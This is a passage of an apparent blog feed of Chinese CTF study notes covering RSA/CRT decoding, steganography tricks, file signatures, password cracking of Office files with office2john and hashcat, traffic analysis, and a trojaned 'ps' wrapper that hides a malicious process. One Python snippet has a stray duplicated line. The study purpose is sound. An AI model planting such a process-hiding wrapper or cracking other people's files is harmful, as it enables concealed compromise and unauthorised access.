class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> reduce<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exgcd</span>(<span class="hljs-params">a, b</span>):<br>    <span class="hljs-keyword">if</span> b==<span class="hljs-number">0</span>: <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>, <span class="hljs-number">0</span><br>    x, y = exgcd(b, a%b)<br>    <span class="hljs-keyword">return</span> y, x - a//b*y<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">uni</span>(<span class="hljs-params">P, Q</span>):<br>    r1, m1 = P<br>    r2, m2 = Q<br><br>    d = gmpy2.gcd(m1, m2)<br>    <span class="hljs-keyword">assert</span> (r2-r1) % d == <span class="hljs-number">0</span><br><br>    l1, l2 = exgcd(m1//d, m2//d)<br>    <br>    <span class="hljs-keyword">return</span> (r1 + (r2-r1)//d*l1*m1) % gmpy2.lcm(m1, m2), gmpy2.lcm(m1, m2)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">CRT</span>(<span class="hljs-params">eq</span>):<br>    <span class="hljs-keyword">return</span> reduce(uni, eq)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:    <br>    ms = [...]   <span class="hljs-comment">#模数</span><br>    cs = [...]   <span class="hljs-comment">#密文</span><br>    m, mod = CRT(<span class="hljs-built_in">zip</span>(cs, ms))<br>    ans = long_to_bytes(m)<br>    <span class="hljs-built_in">print</span>(ans)<br></code></pre></td></tr></table></figure><p><strong>参考：</strong> <a href="https://www.ruanx.net/excrt/">扩展中国剩余定理</a></p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Misc随笔</title>
    <link href="/2025/02/28/Misc%E9%9A%8F%E7%AC%94/"/>
    <url>/2025/02/28/Misc%E9%9A%8F%E7%AC%94/</url>
    
    <content type="html"><![CDATA[<h2 id="Logo语言"><a href="#Logo语言" class="headerlink" title="Logo语言"></a>Logo语言</h2><p><a href="https://www.calormen.com/jslogo/">Logo解释器 (calormen.com)</a></p><p><strong>Logo语言：</strong> Logo语言是一种简单的图形化编程语言，主要用于儿童编程启蒙教育。核心特点是“海龟图形”。</p><p><strong>代码示例：</strong></p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">cs pu lt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 500 </span>rt<span class="hljs-number"> 90 </span>pd fd<span class="hljs-number"> 100 </span>rt<span class="hljs-number"> 90 </span>repeat 18[fd<span class="hljs-number"> 5 </span>rt 10] lt<span class="hljs-number"> 135 </span>fd<span class="hljs-number"> 50 </span>lt<span class="hljs-number"> 135 </span>pu bk<span class="hljs-number"> 100 </span>pd setcolor pick [ red orange yellow green blue violet ] repeat 18[fd<span class="hljs-number"> 5 </span>rt 10] rt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 60 </span>rt<span class="hljs-number"> 90 </span>bk<span class="hljs-number"> 30 </span>rt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 60 </span>pu lt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 100 </span>pd rt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 50 </span>bk<span class="hljs-number"> 50 </span>setcolor pick [ red orange yellow green blue violet ] lt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 50 </span>rt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 50 </span>pu fd<span class="hljs-number"> 50 </span>pd fd<span class="hljs-number"> 25 </span>bk<span class="hljs-number"> 50 </span>fd<span class="hljs-number"> 25 </span>rt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 50 </span>pu setcolor pick [ red orange yellow green blue violet ] fd<span class="hljs-number"> 100 </span>rt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 30 </span>rt<span class="hljs-number"> 45 </span>pd fd<span class="hljs-number"> 50 </span>bk<span class="hljs-number"> 50 </span>rt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 50 </span>bk<span class="hljs-number"> 100 </span>fd<span class="hljs-number"> 50 </span>rt<span class="hljs-number"> 45 </span>pu fd<span class="hljs-number"> 50 </span>lt<span class="hljs-number"> 90 </span>pd fd<span class="hljs-number"> 50 </span>bk<span class="hljs-number"> 50 </span>rt<span class="hljs-number"> 90 </span>setcolor pick [ red orange yellow green blue violet ] fd<span class="hljs-number"> 50 </span>pu lt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 100 </span>pd fd<span class="hljs-number"> 50 </span>rt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 25 </span>bk<span class="hljs-number"> 25 </span>lt<span class="hljs-number"> 90 </span>bk<span class="hljs-number"> 25 </span>rt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 25 </span>setcolor pick [ red orange yellow green blue violet ] pu fd<span class="hljs-number"> 25 </span>lt<span class="hljs-number"> 90 </span>bk<span class="hljs-number"> 30 </span>pd rt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 25 </span>pu fd<span class="hljs-number"> 25 </span>lt<span class="hljs-number"> 90 </span>pd fd<span class="hljs-number"> 50 </span>bk<span class="hljs-number"> 25 </span>rt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 25 </span>lt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 25 </span>bk<span class="hljs-number"> 50 </span>pu bk<span class="hljs-number"> 100 </span>lt<span class="hljs-number"> 90 </span>setcolor pick [ red orange yellow green blue violet ] fd<span class="hljs-number"> 100 </span>pd rt<span class="hljs-number"> 90 </span>arc<span class="hljs-number"> 360 </span>20 pu rt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 50 </span>pd arc<span class="hljs-number"> 360 </span>15 pu fd<span class="hljs-number"> 15 </span>setcolor pick [ red orange yellow green blue violet ] lt<span class="hljs-number"> 90 </span>pd bk<span class="hljs-number"> 50 </span>lt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 25 </span>pu home bk<span class="hljs-number"> 100 </span>lt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 100 </span>pd arc<span class="hljs-number"> 360 </span>20 pu home<br></code></pre></td></tr></table></figure><h2 id="压缩包明文攻击"><a href="#压缩包明文攻击" class="headerlink" title="压缩包明文攻击"></a>压缩包明文攻击</h2><p><strong>条件：</strong></p><ul><li><p>加密压缩包</p></li><li><p>未加密压缩包</p></li><li><p>且两个压缩包含有CRC相同的文件</p></li></ul><p>即可使用ARCHPR工具进行明文攻击</p><h2 id="TTL隐写"><a href="#TTL隐写" class="headerlink" title="TTL隐写"></a>TTL隐写</h2><p><strong>特点：</strong></p><ul><li><p>多个0~255的数字</p></li><li><p>大多是”63,127,255”等</p></li><li><p>将数字转成8位二进制数，每个数取前两位，每八位组成一个隐写的数字</p></li></ul><p><strong>代码示例：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<br><br>cnt = <span class="hljs-number">0</span><br>tmp_bin = <span class="hljs-string">&quot;&quot;</span><br>ans = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;C:\\Users\\29226\\Desktop\\BUUctf\\MISC\\第4页\\7\\output2.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;C:\\Users\\29226\\Desktop\\BUUctf\\MISC\\第4页\\7\\attachment.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    total_lines = <span class="hljs-built_in">sum</span>(<span class="hljs-number">1</span> <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f)<br><br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> tqdm(<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;C:\\Users\\29226\\Desktop\\BUUctf\\MISC\\第4页\\7\\attachment.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>), total=total_lines, desc=<span class="hljs-string">&quot;Processing&quot;</span>):<br>    line = line.replace(<span class="hljs-string">&quot;TTL=&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>    num = <span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(line), <span class="hljs-string">&#x27;08b&#x27;</span>)  <span class="hljs-comment"># 8位二进制数，如“0b11111111”</span><br>    tmp_bin += num[:<span class="hljs-number">2</span>]<br>    cnt += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> cnt == <span class="hljs-number">4</span>:<br>        cnt = <span class="hljs-number">0</span><br>        m = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(tmp_bin, <span class="hljs-number">2</span>))<br>        ans.write(m)<br>        tmp_bin = <span class="hljs-string">&quot;&quot;</span>  <span class="hljs-comment"># 清空以进行下次循环</span><br><br>ans.close()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Successfully!!!&quot;</span>)清空以进行下次循环<br><br><span class="hljs-built_in">print</span>(ans)<br></code></pre></td></tr></table></figure><h2 id="零宽度字符隐写"><a href="#零宽度字符隐写" class="headerlink" title="零宽度字符隐写"></a>零宽度字符隐写</h2><p><strong>五种字符：</strong></p><ul><li><p>零宽度空格（\u200b）</p></li><li><p>零宽度非连接符（\u200c）</p></li><li><p>零宽度连接符（\u200d）</p></li><li><p>从左至右书写标记（\u200e）</p></li><li><p>从右至左书写标记（\u200f）</p></li></ul><p><strong>特点：</strong></p><ul><li>在txt等正常查看方式中不可见，与正常文本无异。</li><li>无宽度</li></ul><p><strong>在线工具：</strong><br><a href="https://330k.github.io/misc_tools/unicode_steganography.html">Unicode Steganography with Zero-Width Characters</a></p><h3 id="区分：WhiteSpace编程语言"><a href="#区分：WhiteSpace编程语言" class="headerlink" title="区分：WhiteSpace编程语言"></a>区分：WhiteSpace编程语言</h3><blockquote><p><strong>特点：</strong></p><ul><li>只使用空白字符（<strong>空格、制表符和换行符</strong>）来编写代码。</li><li>仍然能够选中，有宽度。</li></ul><p><strong>在线运行工具：</strong></p><p><a href="https://www.w3cschool.cn/tryrun/runcode?lang=whitespace">whitespace在线运行,在线工具，在线编译IDE_w3cschool</a></p></blockquote><h2 id="M4A音频文件"><a href="#M4A音频文件" class="headerlink" title="M4A音频文件"></a>M4A音频文件</h2><p><strong>文件开头：（与MP4类似）</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> xx <span class="hljs-number">66</span> <span class="hljs-number">74</span> <span class="hljs-number">79</span> <span class="hljs-number">70</span> <span class="hljs-number">4</span>D <span class="hljs-number">34</span> <span class="hljs-number">41</span> <span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><p>（MP4）：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">20</span> <span class="hljs-number">66</span> <span class="hljs-number">74</span> <span class="hljs-number">79</span> <span class="hljs-number">70</span> <span class="hljs-number">4</span>D <span class="hljs-number">34</span> <span class="hljs-number">56</span> <span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><p><strong>开头结构：</strong></p><ul><li><p><code>00 00 00 xx</code> 表示文件头的大小（<code>xx</code> 是一个变量，表示具体的字节长度）。</p></li><li><p><code>66 74 79 70</code> 是 <code>ftyp</code>（file type）的 ASCII 表示，用于标识文件类型。</p></li><li><p><code>4D 34 41 20</code> 是 <code>M4A</code> 的 ASCII 表示，明确指出这是一个 M4A 音频文件。</p></li></ul><h2 id="汉信码"><a href="#汉信码" class="headerlink" title="汉信码"></a>汉信码</h2><p><strong>概念：</strong></p><ul><li>矩阵式二维条码，由中国自主研发，更适合汉字的表示。</li></ul><p><strong>示例：</strong></p><p><img src="/2025/02/28/Misc%E9%9A%8F%E7%AC%94/1.png"></p><p><strong>在线识别：</strong></p><p><a href="https://tuzim.net/hxdecode/">在线汉信码识别,汉信码解码 - 兔子二维码 (tuzim.net)</a></p><h2 id="ELF文件"><a href="#ELF文件" class="headerlink" title="ELF文件"></a>ELF文件</h2><p><strong>概念：</strong></p><ul><li><strong>ELF（Executable and Linkable Format）文件</strong>是一种用于可执行文件、目标代码、共享库和核心转储的标准文件格式。它广泛应用于多种操作系统和架构，尤其是类Unix系统（如Linux、FreeBSD等）。</li></ul><p><strong>结构：</strong></p><ul><li><strong>ELF文件头（ELF Header）：</strong></li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">7F</span> <span class="hljs-number">45</span> <span class="hljs-number">4</span>C <span class="hljs-number">46</span> (.ELF)<br></code></pre></td></tr></table></figure><ul><li><p><strong>程序头表（Program Header Table）</strong></p></li><li><p><strong>段表（Section Header Table）</strong></p></li><li><p><strong>数据区</strong></p></li></ul><p><strong>示例：</strong></p><ul><li>对于ELF可执行文件来说，可在Linux系统中直接运行。</li></ul><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">./ELF_FILE</span><br></code></pre></td></tr></table></figure><h2 id="命令替换（Linux）"><a href="#命令替换（Linux）" class="headerlink" title="命令替换（Linux）"></a>命令替换（Linux）</h2><p><strong>概念：</strong></p><p>攻击者找到系统命令文件，将其替换位恶意脚本或文件（以“ps”命令为例）</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim">whereis <span class="hljs-keyword">ps</span><br><span class="hljs-built_in">mkdir</span> .hide_command<br>mv /usr/bin/<span class="hljs-keyword">ps</span> .hide_command/<br><span class="hljs-keyword">vi</span> /usr/bin/<span class="hljs-keyword">ps</span><br></code></pre></td></tr></table></figure><p>然后在 <code>/usr/bin/ps</code> 中写入恶意脚本，如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>/centos_core.elf &amp; /.hide_command/ps | grep -v <span class="hljs-string">&quot;shell&quot;</span> | grep -v <span class="hljs-string">&quot;centos_core&quot;</span> | grep <span class="hljs-string">&quot;bash&quot;</span><br></code></pre></td></tr></table></figure><p>    脚本会在每次执行 <code>ps</code> 命令时运行一个恶意程序（如 <code>/centos_core.elf</code>），并过滤掉某些进程信息，从而隐藏恶意进程。</p><p><strong>特点：</strong></p><ul><li>通常是<code>/usr/bin/</code>中的命令，如“ps”等</li></ul><p><strong>查询方法：</strong></p><p><code>rpm -Vf /usr/bin/*</code>,可查询命令是否被修改。</p><h2 id="IP地址"><a href="#IP地址" class="headerlink" title="IP地址"></a>IP地址</h2><p><strong>概念：</strong></p><ul><li><strong>全称：</strong> Internet Protocol Address（互联网协议地址）</li></ul><p><strong>功能：</strong></p><ul><li><p><strong>标识设备：</strong> 标识主机的网络接口，提供主机在网络中的位置。</p></li><li><p><strong>网络寻址：</strong> 充当网络寻址中的目的地。</p></li></ul><p><strong>（常用）版本：</strong></p><ul><li><p><strong>IPv4（42亿个地址已用尽）：</strong></p><ul><li><p>32位二进制数组成。XXX.XXX.XXX.XXX（XXX为小于255的10进制数）。</p></li><li><p>A类：1.0.0.1~127.255.255.254</p></li><li><p>B类：128.0.0.1~191.255.255.254</p></li><li><p>C类：192.0.0.1~223.255.255.254</p></li><li><p>D类：留给Internet体系结构委员会(IAB)使用【组播地址】</p></li><li><p>E类：特殊保留地址，如255.255.255.255为<strong>受限广播地址</strong>，用来将一个分组以广播方式发送给本网络中的所有主机，路由器则阻挡该分组通过，将其广播功能限制在本网内部。</p></li></ul></li><li><p><strong>IPv6：</strong></p><ul><li>由128位二进制组成，一般采用32个十六进制数表示。</li></ul></li></ul><p><strong>内网（以下情况一般是内网IP地址）：</strong></p><ul><li><p><strong>A类私有地址</strong>：<code>10.0.0.0</code> 到 <code>10.255.255.255</code></p></li><li><p><strong>B类私有地址</strong>：<code>172.16.0.0</code> 到 <code>172.31.255.255</code></p></li><li><p><strong>C类私有地址</strong>：<code>192.168.0.0</code> 到 <code>192.168.255.255</code></p></li></ul><p><strong>子网：</strong></p><ul><li><p>用<strong>子网掩码</strong>将IP地址分割成多个子网，每个子网都有自己的网络地址和广播地址。</p></li><li><p>目的是将一个大的网络分割成多个小的网络，以便更高效地管理和使用IP地址。</p></li></ul><p><strong>地址转换（NAT）：</strong></p><ul><li><p>NAT设备会将专用网络上的不同IP地址映射为公共互联网上的不同的TCP或者UDP的端口号。</p></li><li><p>在家用网络中，NAT功能通常是在家庭网络的网关中实现的。在这种情况下，连接到网关的计算机具有专用的IP地址，并且网关会在外部接口上进行Internet通信。</p></li><li><p>内部的计算机共享这一个公共的IP地址。</p></li></ul><h2 id="Microsoft-Office加密文档"><a href="#Microsoft-Office加密文档" class="headerlink" title="Microsoft Office加密文档"></a>Microsoft Office加密文档</h2><p><strong>攻击方法：</strong> 使用<strong>office2john和hashcat</strong>破解</p><p><strong>步骤：</strong></p><ul><li>先使用office2john获取加密文档的hash值</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">python office2john.py /home/kali/Desktop/encrypted &gt; hash.txt<br><br><span class="hljs-comment">#再切割为hashcat能处理的数据模式</span><br>awk -F <span class="hljs-string">&quot;:&quot;</span> <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span> hash.txt &gt; hashcat_use.txt<br></code></pre></td></tr></table></figure><ul><li><p>查看输出中的加密文件的office版本</p></li><li><p>使用<code>hashcat --help</code> 找到office文件对应的m<strong>参数</strong>，再使用hashcat破解</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hashcat -a 3 -m 9500 hashcat_use.txt  --increment --increment-min 1 --increment-max 8 ?d?d?d?d?d?d?d?d<br></code></pre></td></tr></table></figure><h2 id="慢扫描电视（sstv）"><a href="#慢扫描电视（sstv）" class="headerlink" title="慢扫描电视（sstv）"></a>慢扫描电视（sstv）</h2><p><strong>慢扫描电视</strong>（Slow-scan television）:是<a href="https://zh.wikipedia.org/wiki/%E4%B8%9A%E4%BD%99%E6%97%A0%E7%BA%BF%E7%94%B5" title="业余无线电">业余无线电</a>爱好者的一种主要图片传输方法，慢扫描电视通过<a href="https://zh.wikipedia.org/wiki/%E6%97%A0%E7%BA%BF%E7%94%B5" title="无线电">无线电</a>传输和接收单色或彩色静态图片。</p><p><strong>特点：</strong> 业余无线电操作员通常在<a href="https://zh.wikipedia.org/wiki/%E7%9F%AD%E6%B3%A2" title="短波">短波</a>（或<a href="https://zh.wikipedia.org/wiki/%E9%AB%98%E9%A0%BB" title="高频">高频</a>）、<a href="https://zh.wikipedia.org/wiki/%E7%94%9A%E9%AB%98%E9%A2%91" title="甚高频">甚高频</a>、<a href="https://zh.wikipedia.org/wiki/%E8%B6%85%E9%AB%98%E9%A2%91" title="超高频">超高频</a>波段使用慢扫描电视。</p><p><strong>工具：</strong> <strong>qsstv</strong> （软件）、RX-SSTV+虚拟声卡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt-get install qsstv<br></code></pre></td></tr></table></figure><p><strong>使用方法：</strong></p><ul><li><p>打开软件后，在<code>Options-&gt;Configuration-&gt;Sound</code>中勾选<code>From file</code></p></li><li><p>点击<code>start receiver</code>开始接收，选择音频文件就可以了。</p></li></ul><h2 id="PT2242"><a href="#PT2242" class="headerlink" title="PT2242"></a>PT2242</h2><p><strong>用途：</strong> 用于<strong>电单车</strong>锁车信号</p><p><strong>PT2242信号</strong>：前面4bit（一般）表示同步码，中间的20bit表示地址码，后面的4bit表示功能码，最后一位是停止码。</p><h2 id="时间隐写（gif）"><a href="#时间隐写（gif）" class="headerlink" title="时间隐写（gif）"></a>时间隐写（gif）</h2><p><strong>介绍：</strong> gif图片每一帧动画之间的<strong>延迟时间</strong>。</p><p><strong>方法：</strong> <code>identify -format &quot;%T&quot; flag.gif</code> 来提取延迟时间。</p><p><strong>常见：</strong> 常见情况是把高延迟记为‘1’，低延迟记为‘0’</p><h2 id="协议中传输数据"><a href="#协议中传输数据" class="headerlink" title="协议中传输数据"></a>协议中传输数据</h2><p><strong>介绍：</strong> 在协议传输中，如ICMP可能每次传输<strong>少量数据</strong>，但拼接起来可能是<strong>特殊文件</strong></p><p><strong>提取方法：</strong> <code>tshark</code></p><p><code>tshark -r out.pcap -T fields -e data &gt; out.txt</code> ，会将流量传输中的数据提取出来。</p><h2 id="TLS私钥流量分析"><a href="#TLS私钥流量分析" class="headerlink" title="TLS私钥流量分析"></a>TLS私钥流量分析</h2><p><strong>注意：</strong> 若流量中出现<code>FTP、SMTP、TCP、TSL</code>等协议，且很多追踪流出现乱码，很有可能是让找私钥key去解密TSL。</p><p><strong>步骤：</strong></p><ul><li>找私钥，格式为</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">-----BEGIN RSA PRIVATE KEY-----<br>XXXXXXX<br>-----END RSA PRIVATE KEY-----<br></code></pre></td></tr></table></figure><ul><li>在wireshark的<strong>首选项</strong>中添加TLS私钥，然后追踪<strong>TLS流</strong>来找信息。</li></ul><h2 id="关键字密码"><a href="#关键字密码" class="headerlink" title="关键字密码"></a>关键字密码</h2><p><strong>介绍：</strong> 古典密码，属于替换密码。<br><strong>特点：</strong> 结构不变，变换前后全是字母，而且大小写一致，多为大写。<br><strong>实现举例：</strong> </p><ul><li>明文：<code>HELLO</code></li><li>关键字：<code>KEYWORD</code></li><li>密文：先求替换表，将关键字去重，从字母表提出来，放在新表最前面。</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ABCDEFGHIJKLMNOPQRSTUVWXYZ</span><br>    ↓  ↓   ↓  ↓<br>KEYWORDABCFGHIJLMNPQSTUVXZ<br></code></pre></td></tr></table></figure><p>对应字母替换后就是密文，在本例中替换后，得到<code>AOGGJ</code>。</p><h2 id="图片拼接-复位"><a href="#图片拼接-复位" class="headerlink" title="图片拼接+复位"></a>图片拼接+复位</h2><p><strong>拼接工具：</strong> <code>montage</code><br><strong>安装：</strong> <code>sudo apt-get install imagemagick</code><br><strong>使用：</strong> <code>montage *.jpg -tile 12x10 -geometry 200x100+0+0 flag.jpg</code><br><code>*.jpg</code>：表示当前文件夹下所有<code>jpg</code>图片<br><code>12x10 </code>：表示合成后为宽12张图片，高10张图片<br><code>200x100+0+0</code>：表示每张小图片宽200像素，高100像素，+0+0表示宽高方向间隙都为0。</p><p><strong>复位工具：</strong> <code>gaps</code><br><strong>安装：（建议python3.9版本）</strong> </p><ul><li><strong>获取项目</strong>：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/nemanja-m/gaps.git<br><span class="hljs-built_in">cd</span> gaps<br></code></pre></td></tr></table></figure><ul><li><strong>安装需求：</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">poetry install<br></code></pre></td></tr></table></figure><ul><li><strong>本地安装项目：</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip install .<br></code></pre></td></tr></table></figure><p><strong>使用：</strong></p><ul><li>打乱</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gaps create images/pillars.jpg puzzle.jpg --size=64<br></code></pre></td></tr></table></figure><ul><li>复位</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gaps run puzzle.jpg solution.jpg --generations=20 --population=600<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTFHub学习日记</title>
    <link href="/2025/02/17/CTFHub%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/"/>
    <url>/2025/02/17/CTFHub%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="一、流量分析"><a href="#一、流量分析" class="headerlink" title="一、流量分析"></a>一、流量分析</h2><h3 id="1、数据库类流量"><a href="#1、数据库类流量" class="headerlink" title="1、数据库类流量"></a>1、数据库类流量</h3><h4 id="1）MySQL流量"><a href="#1）MySQL流量" class="headerlink" title="1）MySQL流量"></a>1）MySQL流量</h4><p><strong>题目：</strong></p><p>一份名位mysql.pcap的文件</p><p><strong>个人思路：</strong></p><p>使用Wireshark打开，发现多种类型的流量如SSH，TCP，ARP，MySQL，联系题目，对MySQL流量进行追踪，发现不能很快出结果。</p><p>然后对字符串进行搜索，尝试搜索”flag”,”ctf”等字符串，发现找到flag。</p><p><img src="/2025/02/17/CTFHub%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/1.png"></p><p><strong>研究学习：</strong></p><p>参考网上的一张关于MySQL的图</p><p><img src="/2025/02/17/CTFHub%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/2.png"></p><p>也就是说Mysql建立连接的过程包括<strong>登录</strong>和<strong>查询</strong>阶段。对MySQL协议流量进行过滤之后，得到</p><p><img src="/2025/02/17/CTFHub%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/3.png"></p><p>现在分析可以知道，前半部分是登录阶段，进行了三次登录尝试，前两次失败，最后一次成功；接着进行对关于user的version、database、table进行了查询，最后查询到之后对数据进行了删除。</p><p><img src="/2025/02/17/CTFHub%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/4.png"></p><p>最后对flag所在位置的思考，从网上了解到，这个flag的设立位置通常是登录IP，在这里也就是攻击者的IP地址。</p><h4 id="2）Redis流量"><a href="#2）Redis流量" class="headerlink" title="2）Redis流量"></a>2）Redis流量</h4><p><strong>题目：</strong></p><p>一个名为redis.pcap的流量包</p><p><strong>个人思路：</strong></p><p>通解方法，Wireshark打开之后，直接搜索”ctfhub“、”flag“等关键词，发现搜到像是flag的东西，但是不完整，看到flag2之后想到应该是拼接flag。</p><p><img src="/2025/02/17/CTFHub%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/5.png"></p><p><img src="/2025/02/17/CTFHub%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/6.png"></p><p>直接就得到了完整flag</p><p><strong>研究学习：</strong></p><p>使用NoSQL（非关系型数据库）进行存储，</p><blockquote><p>SQL（关系型数据库）：<br>基于表格（Table）和关系（Relationship）模型，数据存储在行（Row）和列（Column）中。<br>强调数据的结构化和一致性，通过关系表之间的外键（Foreign Key）来实现数据关联。<br>示例：MySQL、PostgreSQL、Oracle。</p></blockquote><blockquote><p>NoSQL（非关系型数据库）：<br>数据模型多样，常见的有键值存储（Key-Value）、文档存储（Document）、列存储（Column）、图存储（Graph）等。<br>不依赖固定的表格结构，数据存储形式更加灵活。<br>示例：MongoDB（文档存储）、Redis（键值存储）、Cassandra（列存储）、Neo4j（图存储）。</p></blockquote><h4 id="3）MongoDB流量"><a href="#3）MongoDB流量" class="headerlink" 